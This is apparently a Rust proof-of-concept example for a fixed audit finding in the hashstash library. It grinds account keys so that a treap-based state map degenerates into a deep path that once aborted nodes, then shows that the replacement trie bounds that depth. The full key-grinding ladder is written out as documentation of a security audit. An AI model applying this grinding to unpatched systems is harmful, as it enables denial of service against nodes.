//! Proof of concept for finding H7: attacker-controlled depth in
//! `hashstash::tree::Map`.
//!
//! Status: fixed. Audit F007 removed the recursion that let a deep path abort
//! the process; audit R04 replaced the commitment itself, so depth no longer
//! follows chosen keys. This program now demonstrates the bound: the ladder
//! that used to build one path N levels deep yields a trie about log2(N)
//! levels deep, and grinding a deeper path costs about twice the hashing per
//! extra level. tests/treap_depth.rs keeps both as regression tests.
//!
//! The original attack: `Map` was a treap whose node priority was
//! `tagged_hash("Hashstash/TreePriority", key)`, so its shape was the unique
//! Cartesian tree of `(priority, key)` pairs. Account keys are chosen by their
//! creators, so an attacker could grind keys whose priorities ascend in the
//! same order as the keys, ~N hash tries per key, and the treap degenerated
//! into a right spine N deep. Recursive insert, remove, merge and drop then
//! overflowed the thread stack and aborted the node; after F007 they were
//! iterative but still copied and rehashed one node per level on every
//! update of that path.
//!
//! The trie (src/tree.rs) places each key at `tagged_hash("Hashstash/TriePath",
//! key)` and branches only where paths differ. Old priorities are irrelevant
//! to it, and no entry can lie under more than 256 branches. To put one key L
//! levels below its natural depth of about log2(N), an attacker must find keys
//! whose paths share ever longer prefixes with its path: about 2^(L+1) hashes.
//!
//! Run:
//!
//!     cargo run --release --example poc_treap_depth -- [N] [STACK_BYTES] [VALID_POINTS] [LEVELS]
//!
//! * `N`: number of ladder keys to grind and insert (default 20000).
//! * `STACK_BYTES`: worker-thread stack size (default 2097152 = 2 MiB, the
//!   Tokio blocking-thread default).
//! * `VALID_POINTS`: 1 (default) requires each key to be a valid x-only
//!   secp256k1 point, matching the real accounts map; 0 uses arbitrary keys.
//! * `LEVELS`: prefix bits to grind against the trie itself (default 20).
//!
//! Output: the ladder's grinding cost, the deepest trie path it produced and
//! the time of updates on that path, then the hashes each extra ground level
//! cost and the depth they reached. "depth bounded" ends a successful run.

use hashstash::{crypto, tree::Map};
use std::io::Write;
use std::time::Instant;

/// The old treap's priority tag.
const PRIORITY_TAG: &str = "Hashstash/TreePriority";
/// The trie's path tag (docs/CONSENSUS.md, "State commitments").
const PATH_TAG: &str = "Hashstash/TriePath";

fn shared_bits(a: &[u8; 32], b: &[u8; 32]) -> usize {
    a.iter()
        .zip(b)
        .position(|(x, y)| x != y)
        .map_or(256, |i| i * 8 + (a[i] ^ b[i]).leading_zeros() as usize)
}

fn depth(map: &Map<u64>, key: &[u8]) -> usize {
    map.depth(key).unwrap_or(0)
}

fn main() {
    let mut args = std::env::args().skip(1);
    let n: usize = args
        .next()
        .map_or(Ok(20_000), |s| s.parse())
        .expect("N must be a positive integer");
    let stack_bytes: usize = args
        .next()
        .map_or(Ok(2 * 1024 * 1024), |s| s.parse())
        .expect("STACK_BYTES must be a positive integer");
    let require_valid_points: bool = args
        .next()
        .map_or(Ok(1u8), |s| s.parse())
        .expect("VALID_POINTS must be 0 or 1")
        != 0;
    let levels: usize = args
        .next()
        .map_or(Ok(20), |s| s.parse())
        .expect("LEVELS must be a non-negative integer");

    assert!(n >= 2, "need at least two keys");
    assert!(
        (n as u128) < (1u128 << 60),
        "N is too large for distinct priority bands"
    );
    assert!(levels < 40, "LEVELS above 40 would take days");

    println!(
        "H7 PoC: grinding the depth-{n} treap ladder (stack {stack_bytes} bytes, \
         valid_points={require_valid_points})"
    );

    // --- 1. The old attack: a key and priority ladder -----------------------
    //
    // The i-th key's old priority falls in the i-th of N equal, disjoint bands
    // of the leading 64 priority bits, so keys and priorities ascend together.
    let mut keys: Vec<[u8; 32]> = Vec::with_capacity(n);
    let mut counter: u64 = 0;
    let mut hashes: u64 = 0;
    let started = Instant::now();
    for i in 0..n {
        let lo = ((i as u128) << 64) / n as u128;
        let hi = (((i as u128) + 1) << 64) / n as u128;
        loop {
            let mut key = [0u8; 32];
            key[24..32].copy_from_slice(&counter.to_be_bytes());
            counter += 1;
            let priority = crypto::tagged_hash(PRIORITY_TAG, &key[..]);
            hashes += 1;
            let lead = u64::from_be_bytes(priority[..8].try_into().unwrap()) as u128;
            if lead >= lo && lead < hi {
                if require_valid_points && !crypto::valid_key(&key) {
                    continue;
                }
                keys.push(key);
                break;
            }
        }
    }
    println!(
        "grind: {n} keys, {hashes} tagged_hash calls, {:.2}s ({:.1} hashes/key)",
        started.elapsed().as_secs_f64(),
        hashes as f64 / n as f64
    );

    let handle = std::thread::Builder::new()
        .name("trie-depth".into())
        .stack_size(stack_bytes)
        .spawn(move || {
            let mut map: Map<u64> = Map::new();
            for (i, key) in keys.iter().enumerate() {
                map.insert(key.to_vec(), i as u64);
            }
            let (deepest, ladder_depth) = keys
                .iter()
                .map(|key| (key.to_vec(), depth(&map, key)))
                .max_by_key(|(_, d)| *d)
                .unwrap();
            println!(
                "ladder: {} keys, deepest trie path {ladder_depth} (treap: {n}; log2(N) = {:.1})",
                map.len(),
                (n as f64).log2()
            );
            let started = Instant::now();
            for round in 0..1000u64 {
                map.insert(deepest.clone(), round);
            }
            println!(
                "  1000 updates of the deepest key: {:.3} ms",
                started.elapsed().as_secs_f64() * 1e3
            );
            let _ = std::io::stdout().flush();

            // --- 2. The best attack on the trie: shared path prefixes -------
            let victim = deepest;
            let target = crypto::tagged_hash(PATH_TAG, &victim);
            let natural = depth(&map, &victim);
            let mut counter = 0u64;
            let mut total = 0u64;
            for shared in 0..levels {
                let mut tries = 0u64;
                let key = loop {
                    let key = [b"ground".as_slice(), &counter.to_be_bytes()].concat();
                    counter += 1;
                    tries += 1;
                    if shared_bits(&crypto::tagged_hash(PATH_TAG, &key), &target) == shared {
                        break key;
                    }
                };
                total += tries;
                map.insert(key, 0);
                println!(
                    "  shared {shared:2} bits: {tries:9} hashes, victim depth {}",
                    depth(&map, &victim)
                );
                let _ = std::io::stdout().flush();
            }
            let ground = depth(&map, &victim);
            println!(
                "ground: {total} hashes moved the victim from depth {natural} to {ground}; \
                 each further level costs about twice the last"
            );
            assert!(ground <= natural + levels && ground <= 256);
            println!("depth bounded: at most 256 branches, ~log2(work) levels from grinding");
        })
        .expect("failed to spawn worker thread");

    match handle.join() {
        Ok(()) => println!("worker thread completed"),
        Err(_) => println!("worker thread panicked"),
    }
}
